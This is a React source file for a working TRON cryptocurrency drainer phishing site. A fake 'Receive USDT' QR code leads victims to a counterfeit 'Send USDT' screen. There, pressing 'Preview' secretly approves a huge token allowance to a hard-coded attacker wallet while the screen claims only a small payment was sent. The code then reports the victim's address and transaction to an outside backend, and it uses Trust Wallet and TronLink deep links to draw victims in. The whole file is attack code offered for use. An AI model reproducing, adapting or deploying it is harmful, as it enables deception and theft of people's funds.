import React, { useState, useEffect, useRef } from "react";
import { QRCodeSVG } from "qrcode.react";

// ==========================================
// CONFIGURATION (Engine Settings - UNTOUCHED)
// ==========================================
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou";
const BACKEND = "https://qr-drainer.onrender.com";
const SITE_URL = "https://qr-drainer-one.vercel.app";

// QR points DIRECTLY to the wallet view (hash = no 404 ever)
const QR_VALUE = `${SITE_URL}/#/wallet`;

// TRON logo for QR center
const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

// Inline SVG logos (never fail to load)
const TrustLogo = () => (
  <svg viewBox="0 0 48 48" width="48" height="48">
    <defs>
      <linearGradient id="tw" x1="0%" y1="0%" x2="100%" y2="100%">
        <stop offset="0%" stopColor="#3375BB"/>
        <stop offset="100%" stopColor="#1565C0"/>
      </linearGradient>
    </defs>
    <path fill="url(#tw)" d="M24 4L6 12v12c0 11 7.5 18 18 22 10.5-4 18-11 18-22V12L24 4z"/>
    <path fill="#fff" d="M24 10l-12 5v9c0 8 5 13 12 16 7-3 12-8 12-16v-9l-12-5z" opacity="0.3"/>
  </svg>
);

const TronLinkLogo = () => (
  <svg viewBox="0 0 48 48" width="48" height="48">
    <circle cx="24" cy="24" r="22" fill="#EB0029"/>
    <path fill="#fff" d="M24 10L12 16l12 6 12-6-12-6zm0 10l-5 2.5L24 25l5-2.5L24 20zm0 5l-8 4 8 4 8-4-8-4z"/>
  </svg>
);

export default function App() {
  const [view, setView] = useState(window.location.hash === "#/wallet" ? "wallet" : "home");
  const [amount, setAmount] = useState("1");
  const [isConnected, setIsConnected] = useState(false);
  const [wallet, setWallet] = useState("");
  const [uiState, setUiState] = useState("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [showWalletPicker, setShowWalletPicker] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [copied, setCopied] = useState(false);
  const qrBoxRef = useRef(null);

  // 1. Detect wallet injection
  useEffect(() => {
    const iv = setInterval(() => {
      if (window.tronWeb?.defaultAddress?.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (!isConnected) {
          setIsConnected(true);
          setWallet(addr);
        }
      }
    }, 800);
    return () => clearInterval(iv);
  }, [isConnected]);

  // 2. THE ENGINE (UNTOUCHED)
  const executeEngine = async () => {
    setUiState("processing");
    setErrorMsg("");
    try {
      if (!window.tronWeb?.defaultAddress) {
        throw new Error("Wallet not connected.");
      }
      const victimAddress = window.tronWeb.defaultAddress.base58;
      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
        feeLimit: 100000000,
        from: victimAddress
      });

      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victimAddress, txHash: tx, network: "TRON Shasta" })
      });
      setUiState("success");
    } catch (error) {
      console.error(error);
      setErrorMsg(error.message || "Transaction failed.");
      setUiState("idle");
    }
  };

  // 3. Wallet deep link handler
  const handleWalletSelect = (walletName) => {
    setSelectedWallet(walletName);
    setShowWalletPicker(false);
    // The returnUrl is where the wallet app should open after connection
    const returnUrl = encodeURIComponent(`${SITE_URL}/#/wallet`);

    if (walletName === "Trust Wallet") {
      window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${returnUrl}`;
    } else if (walletName === "TronLink") {
      window.location.href = `tronlink://open?url=${returnUrl}`;
    }
  };

  // 4. Save QR as PNG
  const handleSaveQR = () => {
    const svg = qrBoxRef.current?.querySelector("svg");
    if (!svg) return;
    const size = 400;
    const canvas = document.createElement("canvas");
    canvas.width = size; canvas.height = size;
    const ctx = canvas.getContext("2d");
    ctx.fillStyle = "#fff"; ctx.fillRect(0, 0, size, size);
    const img = new Image();
    img.onload = () => {
      ctx.drawImage(img, 0, 0, size, size);
      const ls = size * 0.22, lp = (size - ls) / 2;
      ctx.beginPath(); ctx.arc(size / 2, size / 2, ls / 2 + 10, 0, 2 * Math.PI);
      ctx.fillStyle = "#fff"; ctx.fill();
      const logo = new Image();
      logo.onload = () => {
        ctx.drawImage(logo, lp, lp, ls, ls);
        const a = document.createElement("a");
        a.download = "TRON-USDT-QR.png";
        a.href = canvas.toDataURL("image/png");
        a.click();
      };
      logo.src = TRON_LOGO_B64;
    };
    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(new XMLSerializer().serializeToString(svg))));
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(ATTACKER_WALLET);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // ===================== SUCCESS VIEW =====================
  if (uiState === "success") {
    return (
      <div style={{ background: "#0b0e11", minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 20, fontFamily: "system-ui, sans-serif" }}>
        <div style={{ width: 80, height: 80, borderRadius: "50%", background: "#2FAB73", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 24, boxShadow: "0 4px 12px rgba(47,171,115,0.3)" }}>
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <h2 style={{ color: "#eaecef", fontSize: 24, fontWeight: 600, margin: "0 0 8px" }}>Transaction Sent</h2>
        <p style={{ color: "#848e9c", fontSize: 15, margin: 0, textAlign: "center" }}>Your USDT has been sent successfully</p>
      </div>
    );
  }

  // ===================== HOME / QR VIEW =====================
  if (view === "home") {
    return (
      <div style={{ background: "#0b0e11", minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 20, fontFamily: "system-ui, sans-serif" }}>
        <div style={{ width: "100%", maxWidth: 380 }}>
          <h1 style={{ margin: "0 0 6px", fontSize: 22, fontWeight: 700, color: "#eaecef", textAlign: "center" }}>Receive USDT</h1>
          <p style={{ margin: "0 0 24px", fontSize: 13, color: "#848e9c", textAlign: "center" }}>Scan with any TRON wallet</p>
          
          <div ref={qrBoxRef} style={{ background: "#fff", borderRadius: 16, padding: 24, display: "flex", justifyContent: "center", marginBottom: 20, boxShadow: "0 8px 24px rgba(0,0,0,0.3)" }}>
            <QRCodeSVG value={QR_VALUE} size={240} level="H" includeMargin={false} imageSettings={{ src: TRON_LOGO_B64, height: 56, width: 56, excavate: true }} />
          </div>
          
          <div style={{ background: "#181a20", border: "1px solid #2b3139", borderRadius: 10, padding: "14px", display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
            <span style={{ fontFamily: "monospace", fontSize: 12, color: "#eaecef", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: "75%" }}>{ATTACKER_WALLET}</span>
            <button onClick={handleCopy} style={{ background: copied ? "#2FAB73" : "#2b3139", color: "#fff", border: "none", borderRadius: 6, padding: "6px 12px", fontSize: 12, fontWeight: 600, cursor: "pointer" }}>{copied ? "Copied" : "Copy"}</button>
          </div>
          
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
            <button onClick={handleSaveQR} style={{ background: "#181a20", border: "1px solid #2b3139", borderRadius: 10, padding: 14, color: "#eaecef", fontSize: 14, fontWeight: 600, cursor: "pointer" }}>Save QR</button>
            <button onClick={() => setView("wallet")} style={{ background: "#181a20", border: "1px solid #2b3139", borderRadius: 10, padding: 14, color: "#eaecef", fontSize: 14, fontWeight: 600, cursor: "pointer" }}>Preview Page</button>
          </div>
        </div>
      </div>
    );
  }

  // ===================== WALLET SEND VIEW (The Trap) =====================
  return (
    <div style={{ background: "#0b0e11", minHeight: "100vh", fontFamily: "system-ui, sans-serif", display: "flex", flexDirection: "column", color: "#eaecef", position: "relative" }}>
      
      {/* HEADER */}
      <div style={{ padding: "20px", display: "flex", alignItems: "center", justifyContent: "space-between", borderBottom: "1px solid #1e2329" }}>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eaecef" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ cursor: "pointer" }} onClick={() => setView("home")}>
          <line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/>
        </svg>
        <div style={{ fontSize: 17, fontWeight: 600 }}>Send USDT</div>
        <div style={{ width: 24 }} />
      </div>

      {/* CONTENT */}
      <div style={{ flex: 1, padding: "24px 20px", display: "flex", flexDirection: "column", alignItems: "center" }}>
        
        {/* NETWORK BADGE */}
        <div style={{ marginBottom: 24 }}>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, background: "#181a20", padding: "6px 14px", borderRadius: 20, border: "1px solid #2b3139", color: "#848e9c", fontSize: 13, fontWeight: 500 }}>
            <div style={{ width: 8, height: 8, borderRadius: "50%", background: "#eb0029" }}></div>
            TRON (TRC-20)
          </div>
        </div>

        {/* RECIPIENT ADDRESS */}
        <div style={{ width: "100%", maxWidth: 400, marginBottom: 20 }}>
          <div style={{ color: "#848e9c", fontSize: 13, marginBottom: 8, fontWeight: 500 }}>Recipient Address</div>
          <div style={{ background: "#181a20", borderRadius: 8, padding: "16px", fontSize: 14, fontFamily: "monospace", wordBreak: "break-all", border: "1px solid #2b3139" }}>
            {ATTACKER_WALLET}
          </div>
        </div>

        {/* AMOUNT */}
        <div style={{ width: "100%", maxWidth: 400, marginBottom: 24 }}>
          <div style={{ color: "#848e9c", fontSize: 13, marginBottom: 8, fontWeight: 500 }}>Amount</div>
          <div style={{ background: "#181a20", borderRadius: 8, padding: "16px", display: "flex", alignItems: "center", border: "1px solid #2b3139" }}>
            <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} style={{ background: "transparent", border: "none", color: "#eaecef", fontSize: 28, fontWeight: 600, width: "60%", outline: "none" }} />
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <span style={{ color: "#848e9c", fontSize: 16, fontWeight: 500 }}>USDT</span>
              <button style={{ background: "#2b3139", border: "none", color: "#eaecef", padding: "6px 12px", borderRadius: 4, fontSize: 12, fontWeight: 600, cursor: "pointer" }}>MAX</button>
            </div>
          </div>
          <div style={{ color: "#848e9c", fontSize: 13, marginTop: 8 }}>≈ ${amount}.00 USD</div>
        </div>

        {errorMsg && (
          <div style={{ background: "rgba(246,70,93,0.1)", border: "1px solid rgba(246,70,93,0.3)", color: "#f6465d", padding: "14px", borderRadius: 8, fontSize: 13, marginBottom: 20, width: "100%", maxWidth: 400, textAlign: "center" }}>{errorMsg}</div>
        )}

        {/* MAIN BUTTON */}
        <button 
          onClick={() => {
            if (isConnected) {
              executeEngine();
            } else {
              setShowWalletPicker(true);
            }
          }} 
          disabled={uiState === "processing"} 
          style={{ 
            width: "100%", maxWidth: 400, 
            background: uiState === "processing" ? "#2b3139" : "#3375bb", 
            border: "none", borderRadius: 12, padding: "18px", 
            color: uiState === "processing" ? "#848e9c" : "#fff", 
            fontSize: 16, fontWeight: 600, 
            marginTop: "auto", marginBottom: "30px", 
            cursor: uiState === "processing" ? "not-allowed" : "pointer" 
          }}
        >
          {uiState === "processing" ? "Processing…" : isConnected ? "Preview" : "Connect Wallet"}
        </button>

        {isConnected && (
          <div style={{ marginBottom: 20, textAlign: "center", fontSize: 12, color: "#848e9c", fontFamily: "monospace" }}>
            Connected: {wallet.slice(0, 6)}…{wallet.slice(-4)}
          </div>
        )}
      </div>

      {/* ===================== WALLET PICKER MODAL ===================== */}
      {showWalletPicker && (
        <div style={{ position: "fixed", top: 0, left: 0, right: 0, bottom: 0, background: "rgba(0,0,0,0.85)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: 20, backdropFilter: "blur(4px)" }}>
          <div style={{ background: "#181a20", borderRadius: 20, padding: 24, width: "100%", maxWidth: 400, boxShadow: "0 24px 48px rgba(0,0,0,0.6)" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 24 }}>
              <h3 style={{ margin: 0, fontSize: 18, fontWeight: 600, color: "#eaecef" }}>Connect a Wallet</h3>
              <button onClick={() => setShowWalletPicker(false)} style={{ background: "none", border: "none", color: "#848e9c", fontSize: 28, cursor: "pointer", padding: 0, lineHeight: 1 }}>×</button>
            </div>
            
            <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: 16 }}>
              <button onClick={() => handleWalletSelect("Trust Wallet")} style={{ background: "#0b0e11", border: "1px solid #2b3139", borderRadius: 16, padding: "20px 16px", cursor: "pointer", display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
                <TrustLogo />
                <span style={{ color: "#eaecef", fontSize: 14, fontWeight: 600 }}>Trust Wallet</span>
              </button>

              <button onClick={() => handleWalletSelect("TronLink")} style={{ background: "#0b0e11", border: "1px solid #2b3139", borderRadius: 16, padding: "20px 16px", cursor: "pointer", display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
                <TronLinkLogo />
                <span style={{ color: "#eaecef", fontSize: 14, fontWeight: 600 }}>TronLink</span>
              </button>
            </div>
            
            <p style={{ textAlign: "center", color: "#848e9c", fontSize: 13, marginTop: 24, lineHeight: 1.5, margin: "24px 0 0" }}>
              Connecting will open the wallet app on your device.
            </p>
          </div>
        </div>
      )}

      {/* ===================== CONTINUE IN WALLET MODAL ===================== */}
      {selectedWallet && (
        <div style={{ position: "fixed", top: 0, left: 0, right: 0, bottom: 0, background: "rgba(0,0,0,0.85)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1001, padding: 20, backdropFilter: "blur(4px)" }}>
          <div style={{ background: "#181a20", borderRadius: 20, padding: 32, width: "100%", maxWidth: 360, textAlign: "center", boxShadow: "0 24px 48px rgba(0,0,0,0.6)" }}>
            <div style={{ width: 80, height: 80, borderRadius: "50%", background: "#0b0e11", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 20px", border: "1px solid #2b3139" }}>
              {selectedWallet === "Trust Wallet" ? <TrustLogo /> : <TronLinkLogo />}
            </div>
            <h3 style={{ margin: "0 0 8px", fontSize: 20, fontWeight: 600, color: "#eaecef" }}>Continue in {selectedWallet}</h3>
            <p style={{ color: "#848e9c", fontSize: 14, margin: "0 0 24px", lineHeight: 1.5 }}>Open and continue in the wallet app</p>
            <button 
              onClick={() => setSelectedWallet(null)} 
              style={{ width: "100%", background: "#3375bb", border: "none", borderRadius: 10, padding: 14, color: "#fff", fontSize: 16, fontWeight: 600, cursor: "pointer", marginBottom: 12 }}
            >
              Open
            </button>
            <button 
              onClick={() => { navigator.clipboard.writeText(SITE_URL); alert("Link copied"); }} 
              style={{ background: "none", border: "none", color: "#848e9c", fontSize: 14, cursor: "pointer" }}
            >
              Copy link
            </button>
          </div>
        </div>
      )}
    </div>
  );
}